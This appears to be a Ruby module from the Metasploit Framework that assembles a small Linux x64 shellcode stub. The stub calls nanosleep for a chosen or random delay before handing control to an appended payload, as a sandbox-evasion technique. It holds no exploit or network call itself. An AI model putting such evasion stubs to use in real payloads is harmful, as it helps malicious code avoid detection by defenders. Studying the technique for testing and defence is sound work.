module Msf::Payload::Linux::X64::SleepEvasion

  def sleep_evasion(opts = {})
    seconds = opts[:seconds] || rand(60)
    asm = <<-ASM
      ; nanosleep(&timespec, NULL)
      push 0                  ; timespec.tv_nsec = 0
      push #{seconds}         ; timespec.tv_sec = <seconds>
      mov rdi, rsp            ; rdi -> timespec on stack
      xor rsi, rsi            ; rsi = NULL (remaining time pointer)
      mov eax, 35             ; syscall number for nanosleep (0x23)
      syscall                 ; invoke syscall
      add rsp, 16             ; restore stack
      ; execution continues to appended payload
    ASM

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end